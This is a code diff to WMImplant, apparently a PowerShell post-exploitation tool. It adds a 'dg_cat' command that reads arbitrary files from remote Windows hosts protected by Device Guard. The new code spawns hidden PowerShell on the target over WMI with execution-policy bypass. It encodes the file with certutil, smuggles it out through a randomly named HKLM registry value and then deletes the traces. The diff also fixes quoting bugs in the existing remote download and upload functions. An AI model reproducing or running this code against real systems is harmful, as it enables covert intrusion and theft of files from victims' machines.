@@ -711,15 +711,30 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command cat -Target $GenTarget -RemoteFile $FileRead -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command cat -Target $GenTarget -RemoteFile $FileRead`n"
-                $Command
             }
+            $Command
         }
+
+        "dg_cat"
+        {
+            $FileRead = Read-Host "What's the full path to the file you'd like to read? >"
+
+            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
+            {
+                $Command = "`nInvoke-WMImplant -command dg_cat -Target $GenTarget -RemoteFile $FileRead -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+            }
+
+            else
+            {
+                $Command = "`nInvoke-WMImplant -command dg_cat -Target $GenTarget -RemoteFile $FileRead`n"
+            }
+            $Command
+        }`
 
         "dg_download"
         {
@@ -730,14 +745,13 @@ function Invoke-CommandGeneration
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
                 $Command = "`nInvoke-WMImplant -command dg_download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                $Command
             }
 
             else
             {
                 $Command = "`nInvoke-WMImplant -command dg_download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget`n"
-                $Command
             }
+            $Command
         }
 
         "dg_upload"
@@ -2349,6 +2363,32 @@ function Invoke-WMImplant
                     }
                 }
 
+                "dg_cat"
+                {
+                    if(!$Target)
+                    {
+                        Throw "You need to specify a target to run the command against!"
+                    }
+
+                    if(!$RemoteFile)
+                    {
+                        Throw "You need to specify a file to read with the RemoteFile flag!"
+                    }
+
+                    Foreach($Computer in $Target)
+                    {
+                        if($RemoteCredential)
+                        {
+                            Get-FileContentsWMImplantDG -Creds $RemoteCredential -Target $Computer -File $RemoteFile
+                        }
+
+                        else
+                        {
+                            Get-FileContentsWMImplantDG -Target $Computer -File $RemoteFile
+                        }
+                    }
+                }
+
                 "dg_download"
                 {
                     if(!$Target)
@@ -3353,6 +3393,7 @@ function Show-WMImplantMainMenu
     $menu_options += "File Operations`n"
     $menu_options += "====================================================================`n"
     $menu_options += "cat - Attempt to read a file's contents`n"
+    $menu_options += "dg_cat - Attempt to read a file's contents from a device guard protected system`n"
     $menu_options += "dg_download - Download a file from a device guard protected system`n"
     $menu_options += "dg_upload - Upload a file to a device guard protected system`n"
     $menu_options += "download - Download a file from a remote machine`n"
@@ -3448,6 +3489,19 @@ function Use-MenuSelection
                 else
                 {
                     Get-FileContentsWMImplant
+                }
+            }
+
+            "dg_cat"
+            {
+                if ($Credential)
+                {
+                    Get-FileContentsWMImplantDG -Creds $Credential
+                }
+
+                else
+                {
+                    Get-FileContentsWMImplantDG
                 }
             }
 
@@ -4116,6 +4170,103 @@ function Get-FileContentsWMImplant
     end{}
 }
 
+function Get-FileContentsWMImplantDG
+{
+
+    param
+    (
+        [Parameter(Mandatory = $False)]
+        [System.Management.Automation.PSCredential]$Creds,
+        [Parameter(Mandatory = $False)]
+        [string]$Target,
+        [Parameter(Mandatory = $False)]
+        [string]$File
+    )
+
+    Process
+    {
+        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
+        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
+        # The reghive value is for hkey_local_machine
+        $reghive = 2147483650
+        $regpath = "SOFTWARE\Microsoft\Windows"
+        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name
+
+        if(!$Target)
+        {
+            $Target = Read-Host "What system are you targeting? >"
+            $Target = $Target.Trim()
+        }
+
+        if(!$File)
+        {
+            $File = Read-Host "What's the full path to the file you'd like to view? >"
+            $File = $File.Trim()
+        }
+
+        $temp_path = Split-Path -Path $File
+        if($temp_path.EndsWith("\"))
+        {
+            $temp_path += 'temp.txt'
+        }
+        else
+        {
+            $temp_path += '\temp.txt'
+        }
+
+        # On remote system, save file to registry
+        Write-Verbose "Reading remote file and writing on remote registry"
+        $remote_command = 'certutil -encode ''' + "$File" + ''' ''' + $temp_path + '''; $fct = Get-Content -Path ''' + "$temp_path" + '''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fct -PropertyType String -Force; del ''' + "$temp_path" + ''''
+        $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
+
+        if($Creds)
+        {
+            Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -Credential $Creds -ComputerName $Target
+        }
+        else
+        {
+            Invoke-WmiMethod -class win32_process -Name Create -Argumentlist $remote_command -ComputerName $Target
+        }
+
+        Write-Verbose "Sleeping to let remote system read and store file"
+        Start-Sleep -s 30
+
+        # Grab file from remote system's registry
+        Write-Verbose "Reading file from remote registry"
+
+        if($Creds)
+        {
+            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
+        }
+        else
+        {
+            $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $Target
+        }
+
+        # This part stored encoded data to disk, decodes it
+        # displays the contents, and deletes temp files
+        Set-Content -Path C:\tmp.txt -Value $remote_reg.sValue
+        certutil -decode C:\tmp.txt C:\out.txt
+        Get-Content C:\out.txt
+        del C:\tmp.txt
+        del C:\out.txt
+
+        # Removing Registry value from remote system
+        Write-Verbose "Removing registry value from remote system"
+
+        if($Creds)
+        {
+            Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target -Credential $Creds
+        }
+        else
+        {
+            Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $Target
+        }
+        Write-Verbose "Done!"
+    }
+    end{}
+}
+
 function Invoke-FileTransferWMImplant
 {
     param
@@ -4369,11 +4520,18 @@ function Invoke-FileTransferWMImplantDG
             }
 
             $temp_path = Split-Path -Path $Download_File
-            $temp_path += '\temp.txt'
+            if($temp_path.EndsWith("\"))
+            {
+                $temp_path += 'temp.txt'
+            }
+            else
+            {
+                $temp_path += '\temp.txt'
+            }
 
             # On remote system, save file to registry
             Write-Verbose "Reading remote file and writing on remote registry"
-            $remote_command = 'certutil -encode ''' + "$Download_file" + ''' ''' + $temp_path + '''; $fct = Get-Content -Path ''' + "$temp_path" + '''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fct -PropertyType String -Force; del ''' + "$temp_path + '''"
+            $remote_command = 'certutil -encode ''' + "$Download_file" + ''' ''' + $temp_path + '''; $fct = Get-Content -Path ''' + "$temp_path" + '''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fct -PropertyType String -Force; del ''' + "$temp_path" + ''''
             $remote_command = 'powershell -nop -exec bypass -c "' + $remote_command + '"'
 
             if($Creds)
@@ -4466,11 +4624,18 @@ function Invoke-FileTransferWMImplantDG
 
             # Temp location for decoding file
             $upload_temp = Split-Path -Path $Upload_Dir
-            $upload_temp += '\updcd.txt'
+            if($upload_temp.EndsWith("\"))
+            {
+                $upload_temp += 'temp.txt'
+            }
+            else
+            {
+                $upload_temp += '\temp.txt'
+            }
             
             # grabs registry value and saves to disk
             Write-Verbose "Connecting to $Target"
-            $remote_posh = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $pas = ConvertTo-SecureString ''' + "$LocalPass'" + ' -asplaintext -force; $crd = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist ''' + "$LocalUser'" +',$pas; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value -ComputerName ' + "$SystemHostname" + ' -Credential $crd; Set-Content -Path ' + "$upload_temp" + ' $out.sValue; certutil -decode ' + "$upload_temp" + ' ' + "$Upload_Dir" + '; del ' + "$upload_temp"
+            $remote_posh = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $pas = ConvertTo-SecureString ''' + "$LocalPass'" + ' -asplaintext -force; $crd = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist ''' + "$LocalUser'" +',$pas; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value -ComputerName ' + "$SystemHostname" + ' -Credential $crd; Set-Content -Path ' + "$upload_temp" + ' $out.sValue; certutil -decode ' + "$upload_temp" + ' ' + "$Upload_Dir" + '; del ''' + "$upload_temp" + ''''
             $remote_posh = 'powershell -nop -exec bypass -c "' + $remote_posh + '"'
 
             if($Creds)
